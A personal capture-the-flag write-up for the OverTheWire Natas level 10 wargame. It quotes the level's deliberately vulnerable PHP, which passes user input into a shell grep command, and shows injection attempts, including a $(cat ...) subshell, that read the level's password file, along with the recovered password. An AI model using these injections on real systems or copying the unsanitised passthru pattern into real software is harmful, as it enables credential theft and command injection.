Well that took much longer than expected. I went down the over-engineering path for sure.

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>

- My first track was to search for preg_match exploits: turns out if you give needle as an Array in the url, it gives a full path disclosure as explained here:
https://www.exploit-db.com/exploits/10083

<?php
$key[] = " * dictionary.txt < echo /etc/natas_webpass/natas11)";

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        echo "Input contains an illegal character!\n";

    } else {
        echo $key;
    }
}
?>

For php <= 5.3 the execution won't stop and you would reach the else statement. Only weirdly enough, the key[0] would get overriden and be simply equal to "Array". After batailling for a minute with this, i decided to stop trying to bypass preg_match as it apparently was not the solution.

I then tried to implement a subshell, as those characters were still allowed.

$(cat /etc/natas_webpass/natas11)

I tried with echo as well, tried writting it in dictionary, or index.php but no luck.
After a quick coffee break, I realized "wait i've used grep to filter ouput accross multiple files before.."

The solution was so simple in the end I felt stupid.
http://natas10.natas.labs.overthewire.org/?needle= a /etc/natas_webpass/natas11

This, appended to the pasthru command would be: grep -i a /etc/natas_webpass/natas11 dictionary.txt


/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
...


-____-
yelp it took me 2hours
but it was so f*****g fun <3